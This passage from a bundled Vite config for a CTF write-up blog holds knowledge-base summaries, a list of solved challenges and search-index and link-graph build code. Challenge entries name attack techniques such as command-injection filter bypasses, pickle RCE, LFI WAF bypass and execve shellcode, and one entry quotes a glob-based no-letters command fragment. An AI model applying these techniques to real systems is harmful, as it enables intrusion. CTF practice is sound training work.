              "summary": "\u628A\u5386\u5E74\u4F1A\u8BDD\u6863\u6848\u3001\u539F\u59CB\u6750\u6599\u3001\u9898\u89E3\u6848\u4F8B\u548C\u5206\u7C7B\u77E5\u8BC6\u9875\u8FDE\u6210\u4E00\u4E2A\u5165\u53E3\uFF1B\u5148\u6309\u9898\u578B\u5B9A\u4F4D\uFF0C\u518D\u8FDB\u5165\u4E13\u9898\u9875\u6216\u539F\u59CB\u8BB0\u5F55\u3002"
            }
          ]
        }
      ]
    },
    {
      "id": "entity",
      "title": "\u5B9E\u4F53",
      "groups": [
        {
          "id": "entity",
          "title": "\u5B9E\u4F53",
          "notes": [
            {
              "name": "\u672C\u673A\u73AF\u5883\u4E0ECTF\u5DE5\u5177\u94FE",
              "title": "\u672C\u673A\u73AF\u5883\u4E0ECTF\u5DE5\u5177\u94FE",
              "summary": '\u4E3B\u4EBA\u8FD9\u53F0 Windows 11 \u4E0A\u7684"\u6253 CTF \u5BB6\u5E95"\uFF1A\u4E24\u5957 Python\u3001\u4E00\u4E2A WSL\u3001\u53CD\u7F16\u8BD1\u4E09\u4EF6\u5957\u3001\u6574\u5957 pwn \u5DE5\u5177\u3001\u4EE5\u53CA\u591A\u667A\u80FD\u4F53 CLI\u3002**\u65B0\u4F1A\u8BDD\u5F00\u5DE5\u524D\u5148\u770B\u8FD9\u9875\uFF0C\u7701\u5F97\u91CD\u590D\u8C03\u7814\u73AF\u5883\u3002**'
            },
            {
              "name": "\u9752\u5C91\u5E73\u53F0",
              "title": "\u9752\u5C91\u5E73\u53F0",
              "summary": '\u4E3B\u4EBA\u6253 CTF \u7684\u4E3B\u529B\u5E73\u53F0\uFF08ctf.qingcen.net\uFF09\uFF1A\u7528"\u9898\u96C6 + \u5BB9\u5668\u9776\u673A"\u7684\u6A21\u5F0F\u6258\u7BA1\u6BD4\u8D5B\u4E0E\u7EC3\u4E60\u3002\u8FD9\u9875\u8BB0\u5E73\u53F0\u600E\u4E48\u7528\u3001\u6709\u54EA\u4E9B\u5751\u3002**\u81EA\u52A8\u5316\u811A\u672C\u4F18\u5148\u8D70 API\uFF0C\u5BB9\u5668\u4E0E\u9644\u4EF6\u624D\u7528\u6D4F\u89C8\u5668\u3002**'
            },
            {
              "name": "CTF-\u5E38\u7528\u5DE5\u5177\u6E05\u5355",
              "title": "CTF \u5E38\u7528\u5DE5\u5177\u6E05\u5355",
              "summary": '\u6309\u65B9\u5411\u5206\u7EC4\u7684\u5DE5\u5177\u901F\u67E5\u8868\u3002\u539F\u5219\uFF1A**\u4F18\u5148\u7528\u4F60\u987A\u624B\u7684\u90A3\u4E00\u4E2A**\uFF0C\u4E0D\u8981\u4E3A\u4E86"\u4E13\u4E1A\u611F"\u6362\u6765\u6362\u53BB\u3002\u7CEF\u7C73\u77E5\u9053\u4E3B\u4EBA\u4E60\u60EF\u7528 **HackBar / \u6D4F\u89C8\u5668\u8868\u5355** \u800C\u4E0D\u662F curl\uFF0C\u5DE5\u5177\u8868\u91CC\u5DF2\u6309\u8FD9\u4E2A\u4E60\u60EF\u6392\u3002'
            },
            {
              "name": "CTFShow\u5E73\u53F0",
              "title": "CTFShow\u5E73\u53F0",
              "summary": "\u56FD\u5185\u8001\u724C\u7EC3\u4E60\u5E73\u53F0\uFF08ctf.show\uFF09\u3002\u7279\u70B9\u662F**\u6D4F\u89C8\u5668\u51E0\u4E4E\u5FC5\u987B**\uFF08\u53CD\u81EA\u52A8\u5316\uFF09\u3001session \u8106\u5F31\u3001\u9898\u76EE\u5206\u95E8\u522B\u7C7B\u5237\u3002\u8FD9\u9875\u8BB0\u600E\u4E48\u5728\u8FD9\u91CC\u5C11\u8E29\u5751\u3002"
            }
          ]
        }
      ]
    }
  ]
};

// src/data/challenges.js
var allChallenges = [
  {
    id: 101,
    title: "CTFShow basic \u2014 HTML\u6CE8\u91CABase64",
    slug: "ctfshow-basic",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["HTML", "base64", "infoleak"],
    description: "HTML\u6CE8\u91CA\u4E2D\u9690\u85CFBase64\u7F16\u7801\u7684flag",
    date: "2026-01-10"
  },
  {
    id: 102,
    title: "CTFShow basic_1 \u2014 HTML\u6CE8\u91CABase64",
    slug: "ctfshow-basic-1",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["HTML", "base64"],
    description: "HTML\u6CE8\u91CA\u6CC4\u9732",
    date: "2026-01-10"
  },
  {
    id: 103,
    title: "CTFShow basic_2 \u2014 \u53C2\u6570\u7BE1\u6539",
    slug: "ctfshow-basic-2",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["parameter", "tampering"],
    description: "\u5BA2\u6237\u7AEF\u53C2\u6570\u7BE1\u6539\u83B7\u53D6flag",
    date: "2026-01-10"
  },
  {
    id: 104,
    title: "CTFShow basic_3 \u2014 JSFuck\u89E3\u7801",
    slug: "ctfshow-basic-3",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["JSFuck", "javascript"],
    description: "JSFuck\u7F16\u7801\u89E3\u7801",
    date: "2026-01-11"
  },
  {
    id: 105,
    title: "CTFShow basic_4 \u2014 ASCII\u6570\u7EC4",
    slug: "ctfshow-basic-4",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["ASCII", "javascript"],
    description: "\u524D\u7AEFASCII\u6570\u7EC4\u89E3\u7801",
    date: "2026-01-11"
  },
  {
    id: 106,
    title: "CTFShow basic_5 \u2014 \u5BA2\u6237\u7AEF\u4F2A\u9020",
    slug: "ctfshow-basic-5",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["client-side", "forgery"],
    description: "\u5BA2\u6237\u7AEF\u8EAB\u4EFD\u4F2A\u9020",
    date: "2026-01-11"
  },
  {
    id: 107,
    title: "CTFShow basic_6 \u2014 \u54CD\u5E94\u5934\u6CC4\u9732",
    slug: "ctfshow-basic-6",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["response-header", "infoleak"],
    description: "HTTP\u54CD\u5E94\u5934\u4E2D\u6CC4\u9732flag",
    date: "2026-01-12"
  },
  {
    id: 108,
    title: "CTFShow basic_7 \u2014 302\u54CD\u5E94\u4F53",
    slug: "ctfshow-basic-7",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["302", "redirect", "infoleak"],
    description: "302\u91CD\u5B9A\u5411\u54CD\u5E94\u4F53\u4E2D\u9690\u85CFflag",
    date: "2026-01-12"
  },
  {
    id: 109,
    title: "CTFShow basic_8 \u2014 .phps\u6E90\u7801\u6CC4\u9732",
    slug: "ctfshow-basic-8",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: [".phps", "source-leak"],
    description: ".phps\u6587\u4EF6\u6CC4\u9732PHP\u6E90\u7801",
    date: "2026-01-12"
  },
  {
    id: 110,
    title: "CTFShow basic_9 \u2014 robots.txt",
    slug: "ctfshow-basic-9",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["robots.txt", "infoleak"],
    description: "robots.txt\u6CC4\u9732\u654F\u611F\u8DEF\u5F84",
    date: "2026-01-13"
  },
  {
    id: 111,
    title: "CTFShow basic_10 \u2014 Cookie IDOR",
    slug: "ctfshow-basic-10",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["Cookie", "IDOR"],
    description: "Cookie\u6CE8\u5165\u5B9E\u73B0IDOR\u8D8A\u6743",
    date: "2026-01-13"
  },
  {
    id: 112,
    title: "CTFShow basic_12 \u2014 \u9690\u85CF\u6587\u4EF6",
    slug: "ctfshow-basic-12",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["hidden", "IDOR"],
    description: "\u901A\u8FC7IDOR\u53D1\u73B0\u9690\u85CF\u6587\u6863",
    date: "2026-01-14"
  },
  {
    id: 113,
    title: "CTFShow basic_14 \u2014 /proc/self/fd",
    slug: "ctfshow-basic-14",
    category: "infoleak",
    platform: "CTFShow",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["/proc", "file-descriptor"],
    description: "\u5229\u7528/proc/self/fd\u6587\u4EF6\u63CF\u8FF0\u7B26\u6CC4\u9732",
    date: "2026-01-14"
  },
  {
    id: 201,
    title: "QC ezphp \u2014 \u5F31\u7C7B\u578B\u7ED5\u8FC7",
    slug: "qc-ezphp",
    category: "php",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["PHP", "weak-type"],
    description: "PHP == \u5F31\u7C7B\u578B\u6BD4\u8F83\u7ED5\u8FC7",
    date: "2026-02-01"
  },
  {
    id: 202,
    title: "QC ezphp_1 \u2014 array_search",
    slug: "qc-ezphp-1",
    category: "php",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["PHP", "array_search"],
    description: "array_search\u5F31\u7C7B\u578B\u6F0F\u6D1E",
    date: "2026-02-01"
  },
  {
    id: 203,
    title: "QC ezphp_2 \u2014 \u5D4C\u5957\u5F31\u7C7B\u578B",
    slug: "qc-ezphp-2",
    category: "php",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["PHP", "nested", "weak-type"],
    description: "\u5D4C\u5957\u5F31\u7C7B\u578B\u6BD4\u8F83\u7ED5\u8FC7",
    date: "2026-02-02"
  },
  {
    id: 204,
    title: "QC ezmd5 \u2014 0e MD5",
    slug: "qc-ezmd5",
    category: "php",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["MD5", "0e", "PHP"],
    description: "0e\u5F00\u5934MD5\u78B0\u649E\u7ED5\u8FC7",
    date: "2026-02-02"
  },
  {
    id: 205,
    title: "QC ezmd5_1 \u2014 \u53CC0e MD5",
    slug: "qc-ezmd5-1",
    category: "php",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["MD5", "0e", "PHP"],
    description: "\u53CC0e MD5\u78B0\u649E",
    date: "2026-02-03"
  },
  {
    id: 206,
    title: "QC ezmd5_2 \u2014 md5\u6570\u7EC4",
    slug: "qc-ezmd5-2",
    category: "php",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["MD5", "array", "PHP"],
    description: "md5\u6570\u7EC4\u7ED5\u8FC7",
    date: "2026-02-03"
  },
  {
    id: 207,
    title: "QC ezmd5_3 \u2014 md5\u6570\u7EC4",
    slug: "qc-ezmd5-3",
    category: "php",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["MD5", "array", "PHP"],
    description: "md5\u6570\u7EC4\u7ED5\u8FC7\u53D8\u79CD",
    date: "2026-02-03"
  },
  {
    id: 208,
    title: "QC ezmd5_4 \u2014 MD5\u7206\u7834",
    slug: "qc-ezmd5-4",
    category: "php",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["MD5", "brute-force"],
    description: "MD5\u54C8\u5E0C\u7206\u7834",
    date: "2026-02-04"
  },
  {
    id: 301,
    title: "QC ezcmd \u2014 \u76F4\u63A5\u6267\u884C",
    slug: "qc-ezcmd",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "cmd"],
    description: "\u65E0\u8FC7\u6EE4\u76F4\u63A5\u547D\u4EE4\u6267\u884C",
    date: "2026-02-10"
  },
  {
    id: 302,
    title: "QC ezcmd_1 \u2014 \u5206\u53F7\u6CE8\u5165",
    slug: "qc-ezcmd-1",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "semicolon"],
    description: "\u5206\u53F7\u622A\u65AD\u6267\u884C\u547D\u4EE4",
    date: "2026-02-10"
  },
  {
    id: 303,
    title: "QC ezcmd_2 \u2014 \u6CE8\u91CA\u622A\u65AD",
    slug: "qc-ezcmd-2",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "comment"],
    description: "\u6CE8\u91CA\u7B26\u622A\u65AD\u7ED5\u8FC7",
    date: "2026-02-11"
  },
  {
    id: 304,
    title: "QC ezcmd_3 \u2014 IFS\u7ED5\u8FC7",
    slug: "qc-ezcmd-3",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "IFS", "bypass"],
    description: "$IFS\u7ED5\u8FC7\u7A7A\u683C\u8FC7\u6EE4",
    date: "2026-02-11"
  },
  {
    id: 305,
    title: "QC ezcmd_5 \u2014 \u65E0\u5B57\u6BCDRCE \u2605\u4E00\u8840",
    slug: "qc-ezcmd-5",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "no-alpha", "first-blood"],
    description: "\u8FC7\u6EE4\u6240\u6709\u5B57\u6BCD\uFF0C. /????.??? 2>&1 source\u6CC4\u9732",
    date: "2026-02-12"
  },
  {
    id: 306,
    title: "QC ezcmd_6 \u2014 eval\u6267\u884C",
    slug: "qc-ezcmd-6",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "eval", "PHP"],
    description: "eval\u6CE8\u5165\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4",
    date: "2026-02-12"
  },
  {
    id: 307,
    title: "QC ezcmd_7 \u2014 \u5B57\u7B26\u4E32\u62FC\u63A5",
    slug: "qc-ezcmd-7",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "concat", "PHP"],
    description: "\u5B57\u7B26\u4E32\u62FC\u63A5\u7ED5\u8FC7\u5173\u952E\u8BCD\u8FC7\u6EE4",
    date: "2026-02-13"
  },
  {
    id: 308,
    title: "QC ezcmd_8 \u2014 passthru",
    slug: "qc-ezcmd-8",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "passthru", "PHP"],
    description: "passthru\u51FD\u6570\u6267\u884C\u547D\u4EE4",
    date: "2026-02-13"
  },
  {
    id: 309,
    title: "QC ezcmd_9 \u2014 tab\u7ED5\u8FC7",
    slug: "qc-ezcmd-9",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "tab", "bypass"],
    description: "tab\u5B57\u7B26\u7ED5\u8FC7\u7A7A\u683C\u8FC7\u6EE4",
    date: "2026-02-14"
  },
  {
    id: 310,
    title: "QC ezcmd_10 \u2014 \u6E90\u7801\u6CC4\u9732 \u2605\u4E00\u8840",
    slug: "qc-ezcmd-10",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "source-leak", "first-blood"],
    description: "PHP ?>\u95ED\u5408\u6807\u7B7E\u6CC4\u9732\u6E90\u7801",
    date: "2026-02-14"
  },
  {
    id: 311,
    title: "QC ezcmd_11 \u2014 \u6E90\u7801\u6CC4\u9732 \u2605\u4E00\u8840",
    slug: "qc-ezcmd-11",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "source-leak", "first-blood"],
    description: "readfile\u6CC4\u9732flag.php",
    date: "2026-02-15"
  },
  {
    id: 401,
    title: "QC X0r \u2014 XOR\u89E3\u5BC6",
    slug: "qc-x0r",
    category: "reverse",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["XOR", "reverse"],
    description: "\u53CC\u5C42XOR\u9006\u5411\u89E3\u5BC6",
    date: "2026-02-20"
  },
  {
    id: 402,
    title: "QC Pwn's Door \u2014 \u9006\u5411\u5BC6\u7801",
    slug: "qc-pwn-door",
    category: "reverse",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["reverse", "password"],
    description: "\u9006\u5411\u5206\u6790\u5BC6\u7801\u7B97\u6CD5 0x6b6579",
    date: "2026-02-20"
  },
  {
    id: 403,
    title: "QC input_function \u2014 Shellcode \u2605\u4E00\u8840",
    slug: "qc-input-function",
    category: "pwn",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["shellcode", "pwn", "first-blood"],
    description: '23\u5B57\u8282execve("/bin/sh") shellcode\u7F16\u5199',
    date: "2026-02-22"
  },
  {
    id: 501,
    title: "QingCen #733 \u2014 Diary App (\u65F6\u5E8F+SQLi+Pickle+XXE)",
    slug: "qingcen-733-diary",
    category: "web",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["timing-attack", "SQLi", "pickle", "XXE", "race-condition"],
    description: "Flask\u65E5\u8BB0\u5E94\u7528\u591A\u9636\u6BB5\u6E17\u900F\uFF1A\u65F6\u5E8F\u653B\u51FB\u2192SQL\u6CE8\u5165\u2192Pickle RCE\u2192XXE",
    date: "2026-03-15"
  },
  {
    id: 502,
    title: "QingCen #747 \u2014 PHP LFI Filter Bypass",
    slug: "qingcen-747-lfi",
    category: "web",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["LFI", "php-filter", "bypass", "encoding"],
    description: "PHP LFI\u8FC7\u6EE4\u7ED5\u8FC7\uFF1A\u5927\u5C0F\u5199+URL\u7F16\u7801",
    date: "2026-03-18"
  },
  {
    id: 503,
    title: "QingCen #734 \u2014 Race Condition",
    slug: "qingcen-734-race",
    category: "web",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["race-condition", "TOCTOU"],
    description: "\u7ADE\u6001\u6761\u4EF6\u591A\u6B21\u5151\u6362",
    date: "2026-03-20"
  },
  {
    id: 504,
    title: "Pickle Deserialization RCE",
    slug: "pickle-rce",
    category: "pwn",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["pickle", "deserialization", "RCE"],
    description: "Python Pickle\u53CD\u5E8F\u5217\u5316RCE",
    date: "2026-04-10"
  },
  {
    id: 505,
    title: "HTTP Request Smuggle",
    slug: "http-smuggle",
    category: "web",
    platform: "QingCen",
    difficulty: "Hard",
    solved: false,
    firstBlood: false,
    points: 100,
    tags: ["HTTP-smuggle", "CL-TE"],
    description: "CL-TE\u8BF7\u6C42\u8D70\u79C1",
    date: "2026-03-16"
  },
  {
    id: 506,
    title: "ctf.show Lock \u2014 HMAC\u7B7E\u540D",
    slug: "ctfshow-lock",
    category: "crypto",
    platform: "ctf.show",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["HMAC", "hash", "signature"],
    description: "HMAC\u7B7E\u540D\u7834\u89E3",
    date: "2026-04-02"
  },
  {
    id: 0,
    title: "\u4FE1\u606F\u6536\u96C6\u4E0E\u6CC4\u9732",
    slug: "writeup-infoleak",
    category: "infoleak",
    platform: "CTFShow / QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["HTML", "Cookie", "JWT", "robots.txt", "LFI", "IDOR"],
    description: "HTML\u6CE8\u91CA\u3001\u54CD\u5E94\u5934\u3001302\u54CD\u5E94\u4F53\u3001robots.txt\u3001.phps\u3001Cookie IDOR\u3001/proc/self/fd\u3001LFI\u8DEF\u5F84\u7A7F\u8D8A",
    date: "2026-01-15"
  },
  {
    id: 0,
    title: "PHP \u5F31\u7C7B\u578B\u7ED5\u8FC7",
    slug: "writeup-php",
    category: "php",
    platform: "QingCen / ISCC",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["PHP", "weak-type", "0e-MD5", "array_search", "variable-overwrite"],
    description: "PHP == \u5F31\u6BD4\u8F83\u30010e MD5\u78B0\u649E\u3001array_search\u6F0F\u6D1E\u3001\u53D8\u91CF\u8986\u76D6",
    date: "2026-02-05"
  },
  {
    id: 0,
    title: "\u547D\u4EE4\u6CE8\u5165\u4E0ERCE",
    slug: "writeup-cmd",
    category: "cmd",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["RCE", "command-injection", "no-alpha", "IFS", "bypass"],
    description: "\u5206\u53F7\u6CE8\u5165\u3001IFS\u7ED5\u8FC7\u3001\u65E0\u5B57\u6BCDRCE\u3001eval\u6267\u884C\u3001\u5B57\u7B26\u4E32\u62FC\u63A5\u3001passthru",
    date: "2026-02-16"
  },
  {
    id: 0,
    title: "PWN \u4E0E\u9006\u5411",
    slug: "writeup-pwn",
    category: "pwn",
    platform: "QingCen",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["XOR", "reverse", "shellcode", "pwn"],
    description: "XOR\u89E3\u5BC6\u3001\u9006\u5411\u5BC6\u7801\u7B97\u6CD5\u300123\u5B57\u8282execve shellcode",
    date: "2026-02-23"
  },
  {
    id: 0,
    title: "\u9690\u5199\u672F\u4E0E\u52A0\u5BC6",
    slug: "writeup-stego",
    category: "stego",
    platform: "CTFShow",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["stego", "zero-width", "EXIF", "Base100", "zip"],
    description: "\u96F6\u5BBD\u5B57\u7B26\u9690\u5199\u3001EXIF\u4E09\u5C42Base64\u3001ZIP\u591A\u91CD\u5BC6\u7801\u7834\u89E3",
    date: "2026-03-01"
  },
  {
    id: 0,
    title: "\u6742\u9879\u4E0E\u7EFC\u5408",
    slug: "writeup-misc",
    category: "misc",
    platform: "\u591A\u5E73\u53F0",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["LFI", "SSRF", "variable-overwrite", "misc"],
    description: "LFI\u8DEF\u5F84\u7A7F\u8D8A\u3001SSRF\u591A\u534F\u8BAE\u3001\u53D8\u91CF\u8986\u76D6\u3001CTFHub\u5F69\u86CB",
    date: "2026-03-05"
  },
  {
    id: 0,
    title: "CTF \u5DE5\u5177\u4F7F\u7528\u6307\u5357",
    slug: "writeup-tools",
    category: "tools",
    platform: "\u901A\u7528",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["IDA", "Burp", "GDB", "pwntools", "tools"],
    description: "IDA Pro\u3001Burp Suite\u3001GDB/Pwndbg\u3001Pwntools\u4F7F\u7528\u6559\u7A0B",
    date: "2026-01-05"
  },
  {
    id: 0,
    title: "2026\u5E745\u6708\u7EFC\u5408Writeup",
    slug: "writeup-may2026",
    category: "web",
    platform: "ISCC / QingCen / CTFShow",
    difficulty: "Hard",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["JWT", "SSTI", "SSRF", "XXE", "file-upload", "race-condition", "deserialization"],
    description: "ISCC JWT\u4F2A\u9020\u3001\u9752\u5C91120\u9898\u5168\u901A\u5173\u4E00\u8840\u3001CTFShow web11\u3001PassKey TOCTOU",
    date: "2026-05-06"
  },
  {
    id: 908,
    title: "ezinfoleak \u2014 PHP LFI \u53CC\u91CDURL\u7F16\u7801WAF\u7ED5\u8FC7",
    slug: "qingcen-ezinfoleak",
    category: "web",
    platform: "QingCen",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 344,
    tags: ["LFI", "php-filter", "WAF-bypass", "double-url-encode", "rot13"],
    description: "PHP\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\uFF0C\u901A\u8FC7\u53CC\u91CDURL\u7F16\u7801\u7ED5\u8FC7WAF\uFF0Crot13 filter\u7ED5\u8FC7\u8F93\u51FA\u8FC7\u6EE4\uFF0C\u8BFB\u53D6flag",
    date: "2026-06-24"
  },
  {
    id: 801,
    title: "lit_pujail_reader \u2014 Python Pyjail \u5B57\u7B26\u4E32\u53CD\u8F6C\u9A8C\u8BC1\u7ED5\u8FC7",
    slug: "qingcen-lit-pujail-reader",
    category: "misc",
    platform: "QingCen",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 344,
    tags: ["pyjail", "socket", "string-reverse", "misc"],
    description: "Python pyjail\u670D\u52A1\uFF0C\u901A\u8FC7\u5B57\u7B26\u4E32\u53CD\u8F6C\u9A8C\u8BC1\u540E\u8BFB\u53D6\u6307\u5B9A\u8DEF\u5F84\u6587\u4EF6\u83B7\u53D6flag",
    date: "2026-06-24"
  },
  {
    id: 507,
    title: "MoeCTF ez_base_revenge9 \u2014 Emoji \u7F16\u7801",
    slug: "moectf-emoji",
    category: "moectf-emoji",
    platform: "moectf",
    difficulty: "Easy",
    solved: true,
    firstBlood: false,
    points: 100,
    tags: ["base100", "emoji", "base64", "base58", "base32", "encoding"],
    description: "Base100 (Emoji) \u2192 Base64 \u2192 Base58 \u2192 Base32 \u56DB\u5C42\u94FE\u5F0F\u5265\u79BB",
    date: "2026-09-01"
  },
  {
    id: 508,
    title: "MoeCTF flag.zip \u2014 ZIP \u5DF2\u77E5\u660E\u6587\u653B\u51FB",
    slug: "moectf-zipcrypto",
    category: "moectf-zipcrypto",
    platform: "moectf",
    difficulty: "Medium",
    solved: true,
    firstBlood: false,
    points: 200,
    tags: ["zip", "zipcrypto", "known-plaintext", "bkcrack", "crc32"],
    description: "\u63D0\u793A\u8BED\u5373\u660E\u6587 + CRC32 \u9A8C\u8BC1 + bkcrack \u6062\u590D ZipCrypto \u5185\u90E8\u5BC6\u94A5",
    date: "2026-09-01"
  }
];

// vite.config.js
var __vite_injected_original_import_meta_url = "file:///C:/Users/hwh/blog/frontend/vite.config.js";
var SITE = "https://heliumsenbrg.github.io/ctf-writeup-blog";
var xmlEsc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
var kbNames = () => {
  const out = [];
  for (const s of kb_default.sections) for (const g of s.groups) for (const n of g.notes) out.push(n.name);
  return out;
};
function buildKbGraph() {
  const NOTES_DIR = path.join(fileURLToPath(new URL(".", __vite_injected_original_import_meta_url)), "src", "data", "kb", "notes");
  const nodes = [];
  const links = [];
  for (const s of kb_default.sections) {
    for (const g of s.groups) {
      for (const n of g.notes) {
        let body = "";
        try {
          body = JSON.parse(readFileSync(path.join(NOTES_DIR, `${n.name}.json`), "utf8")).links?.internal || [];
        } catch {
          body = [];
        }
        nodes.push({
          id: n.name,
          title: n.title || n.name,
          section: s.id,
          sectionTitle: s.title,
          group: g.title,
          links: body.length
        });
        for (const t of body) {
          if (t === n.name) continue;
          const a = n.name;
          const b = t;
          const key = a < b ? `${a}||${b}` : `${b}||${a}`;
          links.push({ key, source: a, target: b });
        }
      }
    }
  }
  const ids = new Set(nodes.map((n) => n.id));
  const seen = /* @__PURE__ */ new Set();
  const edges = [];
  for (const l of links) {
    if (seen.has(l.key) || !ids.has(l.target)) continue;
    seen.add(l.key);
    edges.push([l.source, l.target]);
  }
  const deg = Object.fromEntries(nodes.map((n) => [n.id, 0]));
  for (const [a, b] of edges) {
    deg[a] += 1;
    deg[b] += 1;
  }
  for (const n of nodes) n.degree = deg[n.id];
  return { generatedAt: (/* @__PURE__ */ new Date()).toISOString(), nodes, edges };
}
function buildSearchIndex() {
  const items = [];
  for (const [id, a] of Object.entries(articles)) {
    items.push({
      type: "writeup",
      path: `/article/${id}`,
      title: a.title || id,
      sub: a.subtitle || "",
      // 正文也进索引：写解题思路里常搜的是 payload/函数名，光看标题搜不到
      text: `${a.title || ""} ${a.subtitle || ""} ${a.content || ""}`,
      tags: []
    });
  }
  const NOTES_DIR = path.join(fileURLToPath(new URL(".", __vite_injected_original_import_meta_url)), "src", "data", "kb", "notes");
  const readNoteBody = (name) => {
    try {
      return JSON.parse(readFileSync(path.join(NOTES_DIR, `${name}.json`), "utf8")).content || "";
    } catch {
      return "";
    }
  };
  for (const s of kb_default.sections) {
    for (const g of s.groups) {
      for (const n of g.notes) {
        items.push({
          type: "note",
          path: `/kb/${n.name}`,
          title: n.title || n.name,
          sub: n.summary || "",
          text: `${n.title || ""} ${n.name} ${n.summary || ""} ${readNoteBody(n.name)}`,
          tags: [s.title, g.title].filter(Boolean)
        });
      }
    }
  }
  for (const c of allChallenges) {
    items.push({
      type: "challenge",
      path: "/challenges",
      title: c.title || c.slug,
      sub: c.description || "",
      text: `${c.title || ""} ${c.slug} ${c.description || ""} ${(c.tags || []).join(" ")}`,
      tags: [c.platform, c.category].filter(Boolean)
    });
  }
  return { generatedAt: (/* @__PURE__ */ new Date()).toISOString(), items };
}
function seoStaticPlugin() {
  let outDir = "dist";
  return {
    name: "seo-static",
    apply: "build",
    configResolved(cfg) {
      outDir = cfg.build.outDir;
    },
    // dev 下也让搜索/图谱能用（不写盘，现算现给）
